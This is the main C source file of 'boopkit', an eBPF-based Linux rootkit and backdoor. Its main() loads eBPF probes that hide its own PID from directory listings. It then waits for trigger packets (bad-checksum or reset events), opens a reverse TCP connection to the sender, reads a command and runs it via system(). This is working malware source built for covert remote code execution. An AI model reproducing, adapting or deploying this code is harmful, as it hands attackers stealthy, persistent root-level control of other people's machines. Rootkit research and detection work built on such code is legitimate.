// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [boopkit.c]
//
// Where the main() function goes down.

#include <arpa/inet.h>
#include <bpf/bpf.h>
#include <bpf/btf.h>
#include <bpf/libbpf.h>   // libbpf
#include <xdp/libxdp.h>   // libxdp
#include <errno.h>
#include <limits.h>
#include <linux/perf_event.h>
#include <net/if.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// clang-format off
#include "boopkit.h"
#include "common.h"
#include "pr0be.skel.safe.h"
#include "pr0be.skel.xdp.h"
// clang-format on

void usage() {
  asciiheader();
  boopprintf("Boopkit version: %s\n", VERSION);
  boopprintf("Linux rootkit and backdoor over eBPF.\n");
  boopprintf("Author: Kris Nóva <kris@nivenly.com>\n");
  boopprintf("\n");
  boopprintf("Usage: \n");
  boopprintf("boopkit [options]\n");
  boopprintf("\n");
  boopprintf("Options:\n");
  boopprintf("-h, help           Display help and usage for boopkit.\n");
  boopprintf("-i, interface      Interface name. lo, eth0, wlan0, etc\n");
  boopprintf("-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.\n");
  boopprintf("-p, payload        Search boop packet for payload. No reverse connection.\n");
  boopprintf("-q, quiet          Disable output.\n");
  boopprintf("-x, reject         Source addresses to reject triggers from.\n");
  boopprintf("\n");
  exit(0);
}

int recvrce(char dial[INET_ADDRSTRLEN], char *rce) {
  struct sockaddr_in daddr;
  daddr.sin_family = AF_INET;
  daddr.sin_port = htons(PORT);
  if (inet_pton(AF_INET, dial, &daddr.sin_addr) != 1) {
    boopprintf(" XX Destination IP configuration failed.\n");
    return 1;
  }

  int revsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (revsock == -1) {
    // boopprintf(" XX Socket creation failed\n");
    return 1;
  }

  // Set retry socket option
  struct timeval retry;
  int retval;
  retry.tv_sec = TIMEOUT_SECONDS_RECVRCE;
  retry.tv_usec = 0;
  retval = setsockopt(revsock, SOL_SOCKET, SO_SNDTIMEO,
                      (struct timeval *)&retry, sizeof(struct timeval));
  if (retval != 0) {
    boopprintf("Error (%d) setting socket SO_SNDTIMEO: %s\n", retval,
               strerror(errno));
    return 1;
  }
  retval = setsockopt(revsock, SOL_SOCKET, SO_RCVTIMEO,
                      (struct timeval *)&retry, sizeof(struct timeval));
  if (retval != 0) {
    boopprintf("Error (%d) setting socket SO_RCVTIMEO: %s\n", retval,
               strerror(errno));
    return 1;
  }

  if (connect(revsock, (struct sockaddr *)&daddr, sizeof daddr) < 0) {
    // boopprintf(" XX Connection SOCK_STREAM refused.\n");
    return 1;
  }

  // boopprintf("***READ***\n");
  char buffer[MAX_RCE_SIZE];
  read(revsock, buffer, MAX_RCE_SIZE);
  close(revsock);
  strncpy(rce, buffer, MAX_RCE_SIZE);
  return 0;
}

// config is the configuration options for the program
struct config {
  int sudobypass;
  char pr0besafepath[PATH_MAX];
  char pr0bebooppath[PATH_MAX];
  char pr0bexdppath[PATH_MAX];
  int denyc;
  int payload;
  char if_name[16];
  int if_index;
  char deny[MAX_DENY_ADDRS][INET_ADDRSTRLEN];
} cfg;

// clisetup will initialize the config struct for the program
void clisetup(int argc, char **argv) {
  cfg.denyc = 0;
  cfg.payload = 0;
  cfg.sudobypass = 0;
  strcpy(cfg.if_name, "lo");
  if (getenv("HOME") == NULL) {
    strncpy(cfg.pr0bebooppath, PROBE_BOOP, sizeof PROBE_BOOP);
    strncpy(cfg.pr0besafepath, PROBE_SAFE, sizeof PROBE_SAFE);
    strncpy(cfg.pr0bexdppath, PROBE_XDP, sizeof PROBE_XDP);
  } else {
    sprintf(cfg.pr0besafepath, "%s/.boopkit/%s", getenv("HOME"), PROBE_SAFE);
    sprintf(cfg.pr0bebooppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_BOOP);
    sprintf(cfg.pr0bexdppath, "%s/.boopkit/%s", getenv("HOME"), PROBE_XDP);
  }
  for (int i = 0; i < argc; i++) {
    if (argv[i][0] == '-') {
      switch (argv[i][1]) {
        case 's':
          cfg.sudobypass = 1;
          break;
        case 'x':
          strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
          cfg.denyc++;
          break;
        case 'h':
          usage();
          break;
        case 'p':
          cfg.payload = 1;
          break;
        case 'i':
          strcpy(cfg.if_name, argv[i + 1]);
          break;
        case 'q':
          quiet = 1;
          break;
      }
    }
  }
}

static struct env {
  int pid_to_hide;
  int target_ppid;
} env;

// handlepidlookup is called everytime the kernel searches for our pid.
static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
  //const struct event *e = data;
  return 0;
}

void rootcheck(int argc, char **argv) {
  long luid = (long)getuid();
  boopprintf("  -> getuid()  : %ld\n", luid);
  if (luid != 0) {
    boopprintf("  XX Invalid UID.\n");
    if (!cfg.sudobypass) {
      boopprintf("  XX Permission denied.\n");
      exit(1);
    }
    boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
  }
  long lpid = (long)getpid();
  long lppid = (long)getppid();
  boopprintf("  -> getpid()  : %ld\n", lpid);
  boopprintf("  -> getppid() : %ld\n", lppid);
  if (lpid - lppid == 1) {
    // We assume we are running with sudo at this point!
    // If the ppid() and pid() are close together this
    // implies that the process tree has cascaded a new
    // ppid() for the process. In other words, we are probably
    // running with sudo (or similar).
    boopprintf(
        "  XX Running as cascaded pid (sudo) is invalid for obfuscation.\n");
    if (!cfg.sudobypass) {
      boopprintf("  XX Permission denied.\n");
      exit(1);
    }
    boopprintf("  XX sudo bypass enabled! PID obfuscation will not work!\n");
  }
}

/**
 * main
 *
 * Main entrypoint for the program.
 */
int main(int argc, char **argv) {
  clisetup(argc, argv);
  asciiheader();
  rootcheck(argc, argv);
  boopprintf("  -> Logs: cat /sys/kernel/tracing/trace_pipe\n");

  int loaded, err;
  struct bpf_object *bpobj;
  struct pr0be_safe *sfobj;
  struct bpf_program *progboop = NULL;
  struct ring_buffer *rb = NULL;
  struct perf_buffer *pb = NULL;
  char pid[MAXPIDLEN];

  // BPF
  long err_libbfp;

  // XDP
  struct bpf_map              *xdp_perf_map;
  struct xdp_program          *xdp_prog         = NULL;
  struct bpf_program          *xdp_prog_fentry  = NULL;
  struct bpf_program          *xdp_prog_fexit   = NULL;
  int                         xdp_prog_fd;
  struct bpf_object_open_opts *xdp_open_opts;
  const char                  *xdp_prog_fentry_name;
  const char                  *xdp_prog_fexit_name;
  const char                  *xdp_perf_map_name;
  int                         xdp_map_fd;
  int                         xdp_ret;
  int                         xdp_prog_fentry_fd;
  int                         xdp_prog_fexit_fd;
  struct bpf_object           *xdp_obj;

  // ===========================================================================
  // [pr0be.xdp.o]
//  {
//      // Initialize interface
//      cfg.if_index = if_nametoindex(cfg.if_name);
//      boopprintf("  -> Interface [%s] [xcap]\n", cfg.if_name);
//
//      // Load XDP object
//      xdp_obj = bpf_object__open(cfg.pr0bexdppath);
//      if (!xdp_obj) {
//        err_libbfp = libbpf_get_error(xdp_obj);
//        boopprintf("Unable to load XDP object: %s\n", cfg.pr0bexdppath);
//        boopprintf("Unable to load XDP object: %s\n", strerror(-err_libbfp));
//        boopprintf("Privileged access required to load XDP probe!\n");
//        boopprintf("Permission denied.\n");
//        return 1;
//      }
//      // Load xdp_perf_map
//      xdp_perf_map = bpf_object__next_map(xdp_obj, NULL);
//      if (!xdp_perf_map) {
//        err_libbfp = libbpf_get_error(xdp_perf_map);
//        boopprintf("Unable to load XDP data map: %s\n", strerror(-err_libbfp));
//        return 1;
//      }
//      xdp_perf_map_name = bpf_map__name(xdp_perf_map);
//      boopprintf("  ->   eBPF Map Loaded       : %s\n", xdp_perf_map_name);
//
//      // fentry
//      xdp_prog_fentry = bpf_object__find_program_by_name(xdp_obj,"trace_on_entry");
//      if (!xdp_prog_fentry) {
//        err_libbfp = libbpf_get_error(xdp_prog_fentry);
//        boopprintf("Unable to load XDP [fentry] program : %s\n", strerror(-err_libbfp));
//        return 1;
//      }
//      xdp_prog_fentry_name = bpf_program__name(xdp_prog_fentry);
//      xdp_prog_fentry_fd = bpf_program__fd(xdp_prog_fentry);
//      boopprintf("  ->   eBPF Program [fentry] : %s\n", xdp_prog_fentry_name);
//
//      // fexit
//      xdp_prog_fexit = bpf_object__find_program_by_name(xdp_obj,"trace_on_exit");
//      if (!xdp_prog_fexit) {
//        err_libbfp = libbpf_get_error(xdp_prog_fexit);
//        boopprintf("Unable to load XDP [fexit] program : %s\n", strerror(-err_libbfp));
//        return 1;
//      }
//      xdp_prog_fexit_name = bpf_program__name(xdp_prog_fexit);
//      xdp_prog_fexit_fd = bpf_program__fd(xdp_prog_fexit);
//      boopprintf("  ->   eBPF Program [fexit]  : %s\n", xdp_prog_fexit_name);
//
//      bpf_program__set_expected_attach_type(xdp_prog_fentry,
//                                            BPF_TRACE_FENTRY);
//      bpf_program__set_expected_attach_type(xdp_prog_fexit,
//                                            BPF_TRACE_FEXIT);
//      // TODO Set attach func name!
//      bpf_program__set_attach_target(xdp_prog_fentry,
//                                     xdp_prog_fentry_fd,
//                                     NULL);
//      bpf_program__set_attach_target(xdp_prog_fexit,
//                                     xdp_prog_fexit_fd,
//                                     NULL);
//
//      boopprintf("  ->   eBPF Attach Types Set : %s %s\n", xdp_prog_fentry_name, xdp_prog_fexit_name);
//
//
//  }
  // [pr0be.xdp.o]
  // ===========================================================================



  // ===========================================================================
  // [pr0be.safe.o]
  {
    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0besafepath);
    sfobj = pr0be_safe__open();
    // getpid()
    //
    // Note: We know that we can use getpid() as the rootcheck() function above
    //       will manage ensuring we are executing this program without sudo
    env.pid_to_hide = getpid();
    sprintf(pid, "%d", env.pid_to_hide);
    strncpy(sfobj->rodata->pid_to_hide, pid,
            sizeof(sfobj->rodata->pid_to_hide));

    sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
    sfobj->rodata->target_ppid = env.target_ppid;
    loaded = pr0be_safe__load(sfobj);
    if (loaded < 0) {
      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0besafepath);
      boopprintf("Privileged access required to load eBPF probe!\n");
      boopprintf("Permission denied.\n");
      return 1;
    }
    boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0besafepath);
    int index = PROG_01;
    int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
    int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),
                                  &index, &prog_fd, BPF_ANY);
    if (ret == -1) {
      boopprintf("Failed to hide PID: %s\n", strerror(errno));
      return 1;
    }
    index = PROG_02;
    prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
    ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
                              &prog_fd, BPF_ANY);
    if (ret == -1) {
      boopprintf("Failed to obfuscated PID\n");
      return 1;
    }
    err = pr0be_safe__attach(sfobj);
    if (err) {
      boopprintf("Failed to attach %s\n", cfg.pr0besafepath);
      return 1;
    }
    rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL,
                          NULL);
    if (!rb) {
      boopprintf("Failed to create ring buffer\n");
      return 1;
    }
  }
  // [pr0be.safe.o]
  // ===========================================================================



  // ===========================================================================
  // [pr0be.boop.o]
  {
    boopprintf("  -> Loading eBPF Probe: %s\n", cfg.pr0bebooppath);
    bpobj = bpf_object__open(cfg.pr0bebooppath);
    if (!bpobj) {
      boopprintf("Unable to open eBPF object: %s\n", cfg.pr0bebooppath);
      boopprintf("Privileged access required to load eBPF probe!\n");
      boopprintf("Permission denied.\n");
      return 1;
    }
    loaded = bpf_object__load(bpobj);
    if (loaded < 0) {
      boopprintf("Unable to load eBPF object: %s\n", cfg.pr0bebooppath);
      return 1;
    }
    boopprintf("  ->   eBPF Probe Loaded     : %s\n", cfg.pr0bebooppath);
    bpf_object__next_map(bpobj, NULL);
    bpf_object__for_each_program(progboop, bpobj) {
      const char *progname = bpf_program__name(progboop);
      const char *progsecname = bpf_program__section_name(progboop);
      boopprintf("  ->   eBPF Program Attached : %s %s\n", progname, progsecname);
      struct bpf_link *link = bpf_program__attach(progboop);
      if (!link) {
        boopprintf("Unable to link eBPF program: %s\n", progname);
        continue;
      }
    }
  }
  // [pr0be.boop.o]
  // ===========================================================================



  // ===========================================================================
  // [maps]

  // boop
  struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);
  const char *bmapname = bpf_map__name(bpmap);
  boopprintf("  ->   eBPF   Map Name: %s\n", bmapname);
  int fd = bpf_map__fd(bpmap);


  // Forking xdpdump code here
  //
  // listen_on_interface() is the main packet capture method
  // load_and_attach_trace() is for loading/attaching BPF probe
  // load_xdp_trace_program() is for loading the XDP probe




//  struct bpf_program          *xdp_prog_fentry;
//  struct bpf_program          *xdp_prog_fexit;
//  struct bpf_link             *trace_link_fentry = NULL;
//  struct bpf_link             *trace_link_fexit = NULL;
//  xdp_prog_fentry = bpf_object__find_program_by_name(xdp_obj,
//                                                       "trace_on_entry");
//  if (!xdp_prog_fentry) {
//    boopprintf("ERROR: Can't find XDP trace fentry function!\n");
//    return 0;
//  }
//
//  xdp_prog_fexit = bpf_object__find_program_by_name(xdp_obj,
//                                                      "trace_on_exit");
//  if (!xdp_prog_fexit) {
//    boopprintf("ERROR: Can't find XDP trace fexit function!\n");
//    return 0;
//  }





  // ----
//  struct perf_event_attr       perf_attr = {
//      .sample_type = PERF_SAMPLE_RAW | PERF_SAMPLE_TIME,
//      .type = PERF_TYPE_SOFTWARE,
//      .config = PERF_COUNT_SW_BPF_OUTPUT,
//      .sample_period = 1,
//      .wakeup_events = 1,
//  };

  // --------------------------------------------------------------------------------
  //  perf_buffer__new_raw(int map_fd, size_t page_cnt, struct perf_event_attr *attr,
  //                       perf_buffer_event_fn event_cb, void *ctx,
  //                       const struct perf_buffer_raw_opts *opts);
  // TODO callback function! Woo!
  //pb = perf_buffer__new_raw(xdp_map_fd, 256, &perf_attr, NULL, NULL, NULL);
  // --------------------------------------------------------------------------------

  // logs
  for (int i = 0; i < cfg.denyc; i++) {
    boopprintf("   X Deny address: %s\n", cfg.deny[i]);
  }
  boopprintf("  -> Obfuscating PID: %s\n", pid);

  // ===========================================================================
  // Boopkit event loop
  //
  // Boopkit will run as a persistent daemon in userspace!
  //
  //
  int ignore = 0;
  while (1) {
    ring_buffer__poll(rb, 100); // Ignore errors!
    //perf_buffer__poll(pb, 100); // Ignore errors!

    int ikey = 0, jkey;
    int err;
    char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.
    __u8 saddrbytes[4];
    struct event_boop_t ret;


    while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {
      err = bpf_map_lookup_elem(fd, &jkey, &ret);
      if (err < 0) {
        continue;
      }

      // Calculate saddrval
      // Copy the first 4 bytes on to saddrbytes
      memcpy(saddrbytes, ret.saddr, sizeof saddrbytes);
      inet_ntop(AF_INET, &saddrbytes, saddrval, sizeof(saddrval));

      // ---- [ FILTER ] -----
      ignore = 0;
      for (int i = 0; i < cfg.denyc; i++) {
        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {
          // Ignoring string in deny list
          ignore = 1;
          break;
        }
      }
      // ---- [ FILTER ] ----

      if (!ignore) {
        // Arrange the saddrval bytes from the kernel
        if (ret.event_src_code == EVENT_SRC_BAD_CSUM) {
          boopprintf("  ** Boop EVENT_SRC_BAD_CSUM\n");
        } else if (ret.event_src_code == EVENT_SRC_RECEIVE_RESET) {
          boopprintf("  ** Boop EVENT_SRC_RECEIVE_RESET\n");
        }
        boopprintf("  ** Boop source: %s\n", saddrval);

        if (!cfg.payload) {
          boopprintf("  -> Reverse connect() %s for RCE\n", saddrval);
          char *rce = malloc(MAX_RCE_SIZE);
          int retval;
          retval = recvrce(saddrval, rce);
          if (retval == 0) {
            boopprintf("  <- Executing: %s\r\n", rce);
            system(rce);
          }
          free(rce);
        } else {

          //__u8 saddrbytes[4];

          // TODO Parse RCE from map/encapsulation
          // TODO Read from XDP
          // boopprintf("  <- Executing: %s\r\n", ret.rce);
          // system(ret.rce);
          // boopprintf("  -> no RCE found!\n");
          // printf("***SEARCH FOR PAYLOAD HERE***\n");
        }
      }
      err = bpf_map_delete_elem(fd, &jkey);
      if (err < 0) {
        return 0;
      }
      ikey = jkey;
    }
  }
}
